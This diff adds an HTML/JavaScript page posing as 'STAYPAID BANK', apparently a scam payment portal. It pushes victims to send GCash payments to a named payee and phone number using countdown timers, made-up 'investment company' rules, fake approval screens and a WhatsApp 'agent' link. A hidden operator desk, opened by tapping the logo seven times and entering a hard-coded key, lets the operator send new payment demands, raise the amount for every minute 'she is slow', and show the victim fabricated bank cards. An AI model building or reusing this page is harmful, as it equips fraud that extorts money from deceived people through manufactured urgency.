@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>STAYPAID BANK</title>
+  <link
+    rel="icon"
+    type="image/png"
+    href="https://cdn.phototourl.com/member/2026-10-01-bc6909ac-262e-4046-82c7-d2a3d4d738e3.png"
+  >
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
+    html, body { width: 100%; height: 100%; }
+    body { background: #f3f8ff; color: #17243a; min-height: 100vh; min-height: 100dvh; overflow-x: hidden; }
+    header { background: #0757c9; color: #fff; padding: 14px 16px; box-shadow: 0 4px 15px rgba(0,60,140,.15); }
+    .brand { display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .brand-icon { width: 44px; height: 44px; border-radius: 10px; object-fit: cover; background: #fff; cursor: pointer; user-select: none; flex-shrink: 0; }
+    .brand h1 { font-size: 20px; margin: 0; letter-spacing: .3px; }
+    .brand span { display: block; margin-top: 2px; font-size: 11px; opacity: .9; }
+    .container { width: 100%; max-width: 480px; margin: 0 auto; padding: 16px 12px 24px; }
+    .card { background: #fff; border-radius: 14px; padding: 20px; box-shadow: 0 6px 20px rgba(0,60,140,.1); border: 1px solid #e0eaf7; width: 100%; }
+    .hidden { display: none !important; }
+    h2 { color: #0757c9; margin-bottom: 8px; font-size: 20px; }
+    h3 { color: #0757c9; margin: 14px 0 8px; font-size: 16px; }
+    .subtitle { color: #68758a; font-size: 13px; line-height: 1.5; margin-bottom: 14px; }
+    input, select, textarea {
+      width: 100%; padding: 13px; border: 1px solid #cbd8ea; border-radius: 9px;
+      font-size: 16px; outline: none; background: #fff; margin-top: 6px; font-family: inherit;
+      -webkit-appearance: none;
+    }
+    textarea { min-height: 80px; resize: vertical; }
+    input:focus, select:focus, textarea:focus { border-color: #0757c9; box-shadow: 0 0 0 3px rgba(7,87,201,.08); }
+    label { display: block; margin-top: 12px; font-size: 12px; color: #4b5b73; font-weight: bold; }
+    button { width: 100%; padding: 14px; border-radius: 9px; margin-top: 12px; font-size: 15px; font-weight: bold; cursor: pointer; transition: .2s; -webkit-tap-highlight-color: transparent; }
+    .primary { background: #0757c9; color: #fff; border: none; }
+    .primary:hover, .primary:active { background: #064aa9; }
+    .success { background: #14804a; color: #fff; border: none; }
+    .secondary { background: #fff; color: #0757c9; border: 1px solid #0757c9; }
+    .ghost { background: transparent; color: #7b8799; border: none; font-size: 13px; font-weight: 600; }
+    .notice { background: #eef6ff; border-left: 4px solid #0757c9; padding: 12px 14px; border-radius: 6px; margin: 12px 0; font-size: 13px; line-height: 1.5; }
+    .notice.ok { background: #e9f8ef; border-left-color: #14804a; }
+    .notice.warn { background: #fff6e8; border-left-color: #d9822b; }
+    .loading { text-align: center; padding: 28px 0; }
+    .spinner { width: 42px; height: 42px; border: 4px solid #dce8f8; border-top-color: #0757c9; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .row { display: flex; justify-content: space-between; align-items: center; gap: 10px; padding: 12px 0; border-bottom: 1px solid #edf1f7; }
+    .label { color: #68758a; font-size: 13px; flex-shrink: 0; }
+    .value { font-weight: bold; text-align: right; font-size: 14px; word-break: break-word; }
+    .payment-box { background: #f6faff; border: 1px solid #dce8f8; padding: 16px; border-radius: 10px; margin-top: 14px; line-height: 1.7; white-space: pre-wrap; font-size: 14px; }
+    .payment-title { color: #0757c9; font-weight: bold; margin-bottom: 8px; }
+    .confirmation-box { text-align: center; background: #eef6ff; border: 1px solid #d5e6fb; padding: 18px; border-radius: 12px; }
+    .confirmation-box.ok { background: #e9f8ef; border-color: #b7e4c7; }
+    footer { text-align: center; color: #7b8799; font-size: 11px; margin: 20px 0 12px; padding: 0 12px; }
+    .split { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .bank-card { background: linear-gradient(135deg,#0757c9,#0a2f6b); color: #fff; border-radius: 14px; padding: 16px; margin-top: 10px; min-height: 130px; box-shadow: 0 8px 20px rgba(7,87,201,.22); }
+    .bank-card .chip { width: 32px; height: 24px; border-radius: 4px; background: linear-gradient(135deg,#f6d365,#fda085); margin-bottom: 18px; }
+    .bank-card .num { letter-spacing: 2px; font-size: 15px; margin-bottom: 14px; }
+    .bank-card .meta { display: flex; justify-content: space-between; font-size: 11px; gap: 8px; }
+    .status-pill { display: inline-block; padding: 4px 10px; border-radius: 99px; font-size: 12px; }
+    .pending { background: #fff4d6; color: #8a6d12; }
+    .approved { background: #d8f5e5; color: #0f6b3a; }
+    .timer { font-size: 32px; font-weight: bold; color: #0757c9; text-align: center; margin: 6px 0 2px; letter-spacing: 1px; }
+    .timer.low { color: #c0392b; animation: pulse 1s infinite; }
+    @keyframes pulse { 50% { opacity: .4; } }
+    #deskApp .card + .card { margin-top: 12px; }
+    @media (min-width: 481px) {
+      .container { padding: 28px 16px 32px; }
+      .card { padding: 26px; border-radius: 16px; }
+      header { padding: 18px 20px; }
+      .brand-icon { width: 52px; height: 52px; }
+      .brand h1 { font-size: 22px; }
+    }
+    @media (max-width: 360px) {
+      .brand h1 { font-size: 18px; }
+      .brand-icon { width: 40px; height: 40px; }
+      .card { padding: 16px; }
+      .timer { font-size: 28px; }
+      .container { padding: 12px 8px 20px; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">
+      <img
+        src="https://cdn.phototourl.com/member/2026-10-01-bc6909ac-262e-4046-82c7-d2a3d4d738e3.png"
+        alt="STAYPAID BANK"
+        class="brand-icon"
+        id="secretIcon"
+      >
+      <div>
+        <h1>STAYPAID BANK</h1>
+        <span id="headerTag">Payment Portal</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <div id="customerApp">
+      <section class="card" id="amountPage">
+        <h2>Payment Amount</h2>
+        <p class="subtitle">Enter the amount you want to submit for payment processing.</p>
+        <input type="number" id="amountInput" placeholder="Enter payment amount" min="1" step="1">
+        <button class="primary" onclick="startPaymentCheck()">Continue</button>
+      </section>
+
+      <section class="card hidden" id="checkingPage">
+        <div class="loading">
+          <div class="spinner"></div>
+          <h2>Checking Payment Details</h2>
+          <p class="subtitle">Please wait while your payment information is being processed.</p>
+        </div>
+      </section>
+
+      <section class="card hidden" id="requirementPage">
+        <h2>Payment Requirement</h2>
+        <div class="notice" id="reqNotice">All GCash for low amounts are off limit.<br>Available GCash accept <strong>₽1,000</strong> upwards.</div>
+        <p class="subtitle" id="reqText" style="text-align:center;margin-bottom:6px;">
+          Tap <strong>Yes</strong> to accept this amount before the time runs out.
+        </p>
+        <div class="timer" id="reqTimer">10:00</div>
+        <p class="subtitle" id="reqTimerNote" style="text-align:center;">
+          If you do not accept in time, the process will restart from the beginning.
+        </p>
+        <button class="primary" onclick="continuePayment()">Yes</button>
+        <button class="secondary" onclick="goBack()">No</button>
+      </section>
+
+      <section class="card hidden" id="dashboardPage">
+        <h2>Payment Dashboard</h2>
+        <div class="notice" id="dashNotice">Payment is currently pending confirmation.</div>
+        <div class="timer" id="liveTimer">10:00</div>
+        <p class="subtitle" id="timerNote" style="text-align:center;margin-bottom:8px;">
+          Complete payment before the time ends.
+        </p>
+        <div class="notice warn" id="rulesNote" style="margin-top:4px;">
+          <strong>NOTE 1 RULES:</strong> All clients under the investment company should keep to time because the stock exchange are also on records.
+        </div>
+        <div class="row"><span class="label">Required Amount</span><span class="value" id="dashAmount">₽1,000</span></div>
+        <div class="row"><span class="label">Status</span><span class="value" id="dashStatus">Pending Confirmation</span></div>
+        <div id="customerCards"></div>
+        <div class="payment-box" id="payInfoBox">
+          <div class="payment-title">* New Gcash account *👇👇👇</div>
+          <strong>Name :</strong> John Michael Alpher<br><br>
+          <strong>Number :</strong> 09705579668
+        </div>
+        <button class="primary" id="paidBtn" onclick="submitPayment()">I Have Paid</button>
+      </section>
+
+      <section class="card hidden" id="confirmationPage">
+        <div class="confirmation-box" id="confirmBox">
+          <h2 id="confirmTitle">Payment Submitted</h2>
+          <p class="subtitle" id="confirmText">Your payment has been submitted for confirmation. Please chat with your agent to confirm the payment.</p>
+        </div>
+        <button class="primary" onclick="openAgentChat()">Chat With Agent</button>
+      </section>
+    </div>
+
+    <div id="deskApp" class="hidden">
+      <section class="card" id="deskLogin">
+        <h2>Private Desk</h2>
+        <p class="subtitle">Enter the developer key.</p>
+        <label>Key</label>
+        <input type="password" id="deskCode" placeholder="Enter key" inputmode="numeric">
+        <button class="primary" onclick="unlockDesk()">Unlock</button>
+        <button class="ghost" onclick="showCustomer()">Cancel</button>
+      </section>
+
+      <section class="card hidden" id="deskHome">
+        <h2>Developer Desk</h2>
+        <p class="subtitle">Send a custom request to the customer. If she is slow, extra amount can be added every minute.</p>
+
+        <div class="row"><span class="label">Current Status</span><span class="value" id="deskStatus">Pending</span></div>
+        <div class="row"><span class="label">Live Amount</span><span class="value" id="deskLiveAmount">₽1,000</span></div>
+
+        <button class="success" id="approveBtn" onclick="approvePayment()">Accept Payment</button>
+        <button class="secondary" onclick="resetPayment()">Reset to Pending</button>
+      </section>
+
+      <section class="card hidden" id="deskRequestBox">
+        <h2>Ask User for Transaction</h2>
+        <p class="subtitle">Write any details you want her to see.</p>
+
+        <label>Title</label>
+        <input id="reqTitle" placeholder="Example: Processing fee">
+
+        <label>Details</label>
+        <textarea id="reqDetails" placeholder="Write any message, account, instruction, or reason"></textarea>
+
+        <label>Starting amount</label>
+        <input type="number" id="reqAmount" placeholder="1000" min="1">
+
+        <div class="split">
+          <div>
+            <label>Time limit (minutes)</label>
+            <input type="number" id="reqMinutes" placeholder="10" min="1">
+          </div>
+          <div>
+            <label>Add after each late minute</label>
+            <input type="number" id="reqPenalty" placeholder="200" min="0">
+          </div>
+        </div>
+
+        <label>Payee name</label>
+        <input id="reqPayee" value="John Michael Alpher">
+
+        <label>Payee number</label>
+        <input id="reqNumber" value="09705579668">
+
+        <button class="primary" onclick="sendRequest()">Send Request to User</button>
+      </section>
+
+      <section class="card hidden" id="deskCardBox">
+        <h2>Add Card</h2>
+        <label>Cardholder name</label>
+        <input id="cardName" placeholder="Enter cardholder name">
+        <label>Card number</label>
+        <input id="cardNumber" placeholder="ACCT-000015" maxlength="19">
+        <div class="split">
+          <div>
+            <label>Expiry</label>
+            <input id="cardExpiry" placeholder="12/28" maxlength="5">
+          </div>
+          <div>
+            <label>CVV</label>
+            <input id="cardCvv" placeholder="123" maxlength="4">
+          </div>
+        </div>
+        <label>Card type</label>
+        <select id="cardType">
+          <option>Platinum</option>
+          <option>Gold</option>
+          <option>Classic</option>
+        </select>
+        <button class="primary" onclick="saveCard()">Save Card</button>
+        <div id="savedCards"></div>
+      </section>
+
+      <button class="ghost" onclick="showCustomer()">Back to Portal</button>
+    </div>
+  </main>
+
+  <footer>© 2026 STAYPAID BANK</footer>
+
+  <script>
+    const KEY = "191005";
+    const STORE = {
+      status: "staypaid_status",
+      cards: "staypaid_cards",
+      request: "staypaid_request"
+    };
+
+    /* ---- Requirement page countdown (10 minutes to accept) ---- */
+    const REQUIREMENT_SECONDS = 10 * 60;
+    let reqTimerInterval = null;
+    let reqDeadline = 0;
+
+    let iconTaps = 0;
+    let tapTimer = null;
+
+    document.getElementById("secretIcon").addEventListener("click", function () {
+      iconTaps += 1;
+      clearTimeout(tapTimer);
+      tapTimer = setTimeout(function () { iconTaps = 0; }, 4000);
+      if (iconTaps >= 7) {
+        iconTaps = 0;
+        showDesk();
+      }
+    });
+
+    function getStatus() {
+      return localStorage.getItem(STORE.status) || "pending";
+    }
+
+    function getCards() {
+      try { return JSON.parse(localStorage.getItem(STORE.cards) || "[]"); }
+      catch (e) { return []; }
+    }
+
+    function getRequest() {
+      try { return JSON.parse(localStorage.getItem(STORE.request) || "null"); }
+      catch (e) { return null; }
+    }
+
+    function money(n) {
+      return "₽" + Number(n || 0).toLocaleString();
+    }
+
+    function liveAmount(req) {
+      if (!req) return 1000;
+      if (getStatus() === "approved") return req.currentAmount || req.amount;
+      const now = Date.now();
+      const end = req.sentAt + (Number(req.minutes) * 60 * 1000);
+      if (now <= end) {
+        req.currentAmount = Number(req.amount);
+        return req.currentAmount;
+      }
+      const lateMs = now - end;
+      const lateMinutes = Math.floor(lateMs / 60000) + 1;
+      req.currentAmount = Number(req.amount) + (lateMinutes * Number(req.penalty || 0));
+      return req.currentAmount;
+    }
+
+    function remainingMs(req) {
+      if (!req) return 0;
+      const end = req.sentAt + (Number(req.minutes) * 60 * 1000);
+      return end - Date.now();
+    }
+
+    function formatTime(ms) {
+      if (ms <= 0) return "00:00";
+      const total = Math.floor(ms / 1000);
+      const m = Math.floor(total / 60);
+      const s = total % 60;
+      return String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
+    }
+
+    function hideAllPages() {
+      stopRequirementCountdown();
+      ["amountPage", "checkingPage", "requirementPage", "dashboardPage", "confirmationPage"]
+        .forEach(function (id) { document.getElementById(id).classList.add("hidden"); });
+    }
+
+    /* ---- Countdown logic ---- */
+    function startRequirementCountdown() {
+      stopRequirementCountdown();
+      reqDeadline = Date.now() + (REQUIREMENT_SECONDS * 1000);
+      const timerEl = document.getElementById("reqTimer");
+      timerEl.classList.remove("low");
+      timerEl.textContent = formatTime(REQUIREMENT_SECONDS * 1000);
+      reqTimerInterval = setInterval(updateRequirementCountdown, 250);
+    }
+
+    function stopRequirementCountdown() {
+      if (reqTimerInterval) {
+        clearInterval(reqTimerInterval);
+        reqTimerInterval = null;
+      }
+    }
+
+    function updateRequirementCountdown() {
+      const timerEl = document.getElementById("reqTimer");
+      const left = reqDeadline - Date.now();
+
+      if (left <= 0) {
+        stopRequirementCountdown();
+        timerEl.textContent = "00:00";
+        timerEl.classList.add("low");
+        restartPaymentFlow();
+        return;
+      }
+
+      timerEl.textContent = formatTime(left);
+      if (left <= 60000) {
+        timerEl.classList.add("low");
+      } else {
+        timerEl.classList.remove("low");
+      }
+    }
+
+    function restartPaymentFlow() {
+      stopRequirementCountdown();
+      document.getElementById("amountInput").value = "";
+      hideAllPages();
+      document.getElementById("amountPage").classList.remove("hidden");
+      alert("Time is up. You did not accept in time, so the process has restarted. Please enter the amount again.");
+    }
+
+    function startPaymentCheck() {
+      const amount = document.getElementById("amountInput").value;
+      if (!amount || Number(amount) <= 0) {
+        alert("Please enter a valid payment amount.");
+        return;
+      }
+      hideAllPages();
+      document.getElementById("checkingPage").classList.remove("hidden");
+      setTimeout(function () {
+        hideAllPages();
+        const req = getRequest();
+        const amt = liveAmount(req);
+        document.getElementById("reqNotice").innerHTML =
+          req && req.title
+            ? ("Request: <strong>" + req.title + "</strong><br>Amount now: <strong>" + money(amt) + "</strong>")
+            : ("All GCash for low amounts are off limit.<br>Available GCash accept <strong>" + money(amt) + "</strong> upwards.");
+        document.getElementById("requirementPage").classList.remove("hidden");
+        startRequirementCountdown();
+      }, 1800);
+    }
+
+    function continuePayment() {
+      stopRequirementCountdown();
+      // Start default 20-min payment timer if no custom request exists
+      let req = getRequest();
+      if (!req) {
+        req = {
+          title: "* New Gcash account *👇👇👇",
+          details: "",
+          amount: 1000,
+          currentAmount: 1000,
+          minutes: 10,
+          penalty: 200,
+          payee: "John Michael Alpher",
+          number: "09705579668",
+          sentAt: Date.now()
+        };
+        localStorage.setItem(STORE.request, JSON.stringify(req));
+        localStorage.setItem(STORE.status, "pending");
+      }
+      hideAllPages();
+      document.getElementById("dashboardPage").classList.remove("hidden");
+      refreshCustomerView();
+    }
+
+    function goBack() {
+      stopRequirementCountdown();
+      hideAllPages();
+      document.getElementById("amountPage").classList.remove("hidden");
+    }
+
+    function submitPayment() {
+      hideAllPages();
+      document.getElementById("confirmationPage").classList.remove("hidden");
+      refreshCustomerView();
+    }
+
+    function openAgentChat() {
+      window.location.href = "https://wa.me/639705579668";
+    }
+
+    function maskCard(num) {
+      const clean = String(num).replace(/\s/g, "");
+      if (clean.length < 4) return clean;
+      return "•••• •••• •••• " + clean.slice(-4);
+    }
+
+    function renderCustomerCards() {
+      const wrap = document.getElementById("customerCards");
+      const cards = getCards();
+      if (!cards.length) { wrap.innerHTML = ""; return; }
+      wrap.innerHTML = cards.map(function (c) {
+        return '<div class="bank-card"><div class="chip"></div><div class="num">' + maskCard(c.number) +
+          '</div><div class="meta"><span>' + c.name + '</span><span>' + c.expiry + ' · ' + c.type + '</span></div></div>';
+      }).join("");
+    }
+
+    function refreshCustomerView() {
+      const status = getStatus();
+      const req = getRequest();
+      const amt = liveAmount(req);
+      const notice = document.getElementById("dashNotice");
+      const dashStatus = document.getElementById("dashStatus");
+      const paidBtn = document.getElementById("paidBtn");
+      const confirmBox = document.getElementById("confirmBox");
+      const timer = document.getElementById("liveTimer");
+      const timerNote = document.getElementById("timerNote");
+
+      document.getElementById("dashAmount").textContent = money(amt);
+      renderCustomerCards();
+
+      const box = document.getElementById("payInfoBox");
+      if (req) {
+        const name = (req.payee || "John Michael Alpher").trim();
+        const number = (req.number || "09705579668").trim();
+        let html = '<div class="payment-title">' + (req.title || "* New Gcash account *👇👇👇") + "</div>";
+        if (req.details) html += req.details + "\n\n";
+        html += "<strong>Name :</strong> " + name + "<br><br>";
+        html += "<strong>Number :</strong> " + number;
+        box.innerHTML = html;
+      }
+
+      if (req && status !== "approved" && status !== "cancelled") {
+        timer.classList.remove("hidden");
+        timerNote.classList.remove("hidden");
+        const left = remainingMs(req);
+        if (left > 0) {
+          timer.textContent = formatTime(left);
+          timer.classList.remove("low");
+          timerNote.textContent = "Complete payment before the time ends.";
+          notice.className = "notice";
+          notice.textContent = "Payment is pending. Finish before the timer ends.";
+        } else {
+          // Timer expired — cancel payment once
+          if (status !== "cancelled") {
+            localStorage.setItem(STORE.status, "cancelled");
+            alert("Your ten minutes expires. Sorry, this payment is cancelled.");
+            // Restart from the beginning
+            setTimeout(function () {
+              localStorage.removeItem(STORE.request);
+              localStorage.setItem(STORE.status, "pending");
+              document.getElementById("amountInput").value = "";
+              hideAllPages();
+              document.getElementById("amountPage").classList.remove("hidden");
+            }, 300);
+            return;
+          }
+        }
+      } else {
+        timer.classList.add("hidden");
+        timerNote.classList.add("hidden");
+      }
+
+      if (status === "approved") {
+        notice.className = "notice ok";
+        notice.textContent = "Payment approved.";
+        dashStatus.innerHTML = '<span class="status-pill approved">Approved</span>';
+        paidBtn.classList.add("hidden");
+        confirmBox.className = "confirmation-box ok";
+        document.getElementById("confirmTitle").textContent = "Payment Approved";
+        document.getElementById("confirmText").textContent = "Your payment of " + money(amt) + " has been accepted.";
+      } else {
+        dashStatus.innerHTML = '<span class="status-pill pending">Pending Confirmation</span>';
+        paidBtn.classList.remove("hidden");
+        confirmBox.className = "confirmation-box";
+        document.getElementById("confirmTitle").textContent = "Payment Submitted";
+        document.getElementById("confirmText").textContent = "Your payment has been submitted for confirmation. Please chat with your agent to confirm the payment.";
+      }
+    }
+
+    function showDesk() {
+      document.getElementById("customerApp").classList.add("hidden");
+      document.getElementById("deskApp").classList.remove("hidden");
+      document.getElementById("headerTag").textContent = "Private Desk";
+    }
+
+    function showCustomer() {
+      document.getElementById("deskApp").classList.add("hidden");
+      document.getElementById("customerApp").classList.remove("hidden");
+      document.getElementById("headerTag").textContent = "Payment Portal";
+      document.getElementById("deskCode").value = "";
+      refreshCustomerView();
+    }
+
+    function unlockDesk() {
+      if (document.getElementById("deskCode").value.trim() !== KEY) {
+        alert("Wrong key.");
+        return;
+      }
+      document.getElementById("deskLogin").classList.add("hidden");
+      document.getElementById("deskHome").classList.remove("hidden");
+      document.getElementById("deskRequestBox").classList.remove("hidden");
+      document.getElementById("deskCardBox").classList.remove("hidden");
+      refreshDesk();
+    }
+
+    function refreshDesk() {
+      const status = getStatus();
+      const req = getRequest();
+      const amt = liveAmount(req);
+      const deskStatus = document.getElementById("deskStatus");
+      const approveBtn = document.getElementById("approveBtn");
+      document.getElementById("deskLiveAmount").textContent = money(amt);
+      if (status === "approved") {
+        deskStatus.innerHTML = '<span class="status-pill approved">Approved</span>';
+        approveBtn.textContent = "Already Accepted";
+        approveBtn.disabled = true;
+      } else {
+        deskStatus.innerHTML = '<span class="status-pill pending">Pending</span>';
+        approveBtn.textContent = "Accept Payment";
+        approveBtn.disabled = false;
+      }
+      renderSavedCards();
+    }
+
+    function sendRequest() {
+      const title = document.getElementById("reqTitle").value.trim() || "Payment Request";
+      const details = document.getElementById("reqDetails").value.trim();
+      const amount = Number(document.getElementById("reqAmount").value);
+      const minutes = Number(document.getElementById("reqMinutes").value);
+      const penalty = Number(document.getElementById("reqPenalty").value);
+      if (!amount || amount <= 0 || !minutes || minutes <= 0) {
+        alert("Enter starting amount and time in minutes.");
+        return;
+      }
+      const req = {
+        title: title,
+        details: details,
+        amount: amount,
+        currentAmount: amount,
+        minutes: minutes,
+        penalty: penalty || 0,
+        payee: document.getElementById("reqPayee").value.trim(),
+        number: document.getElementById("reqNumber").value.trim(),
+        sentAt: Date.now()
+      };
+      localStorage.setItem(STORE.request, JSON.stringify(req));
+      localStorage.setItem(STORE.status, "pending");
+      refreshDesk();
+      refreshCustomerView();
+      alert("Request sent. Timer started for " + minutes + " minute(s).");
+    }
+
+    function approvePayment() {
+      const req = getRequest() || { amount: 1000 };
+      req.currentAmount = liveAmount(req);
+      localStorage.setItem(STORE.request, JSON.stringify(req));
+      localStorage.setItem(STORE.status, "approved");
+      refreshDesk();
+      refreshCustomerView();
+      alert("Payment accepted at " + money(req.currentAmount));
+    }
+
+    function resetPayment() {
+      localStorage.setItem(STORE.status, "pending");
+      localStorage.removeItem(STORE.request);
+      refreshDesk();
+      refreshCustomerView();
+    }
+
+    function formatCardNumber(value) {
+      return value.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
+    }
+
+    document.addEventListener("input", function (e) {
+      if (e.target.id === "cardNumber") e.target.value = formatCardNumber(e.target.value);
+      if (e.target.id === "cardExpiry") {
+        let v = e.target.value.replace(/\D/g, "").slice(0, 4);
+        if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
+        e.target.value = v;
+      }
+    });
+
+    function saveCard() {
+      const name = document.getElementById("cardName").value.trim();
+      const number = document.getElementById("cardNumber").value.trim();
+      const expiry = document.getElementById("cardExpiry").value.trim();
+      const cvv = document.getElementById("cardCvv").value.trim();
+      const type = document.getElementById("cardType").value;
+      if (!name || number.replace(/\s/g, "").length < 12 || !expiry) {
+        alert("Enter card name, number, and expiry.");
+        return;
+      }
+      const cards = getCards();
+      cards.unshift({ name: name, number: number, expiry: expiry, cvv: cvv, type: type });
+      localStorage.setItem(STORE.cards, JSON.stringify(cards));
+      document.getElementById("cardNumber").value = "";
+      document.getElementById("cardExpiry").value = "";
+      document.getElementById("cardCvv").value = "";
+      renderSavedCards();
+      refreshCustomerView();
+    }
+
+    function renderSavedCards() {
+      const box = document.getElementById("savedCards");
+      if (!box) return;
+      const cards = getCards();
+      if (!cards.length) {
+        box.innerHTML = '<p class="subtitle" style="margin-top:16px;">No cards added yet.</p>';
+        return;
+      }
+      box.innerHTML = "<h3>Saved cards</h3>" + cards.map(function (c, i) {
+        return '<div class="bank-card"><div class="chip"></div><div class="num">' + maskCard(c.number) +
+          '</div><div class="meta"><span>' + c.name + '</span><span>' + c.expiry + ' · ' + c.type + '</span></div></div>' +
+          '<button class="secondary" onclick="removeCard(' + i + ')">Remove this card</button>';
+      }).join("");
+    }
+
+    function removeCard(index) {
+      const cards = getCards();
+      cards.splice(index, 1);
+      localStorage.setItem(STORE.cards, JSON.stringify(cards));
+      renderSavedCards();
+      refreshCustomerView();
+    }
+
+    window.addEventListener("storage", function () {
+      refreshCustomerView();
+      refreshDesk();
+    });
+
+    setInterval(function () {
+      refreshCustomerView();
+      refreshDesk();
+    }, 1000);
+
+    refreshCustomerView();
+  </script>
+</body>
+</html>
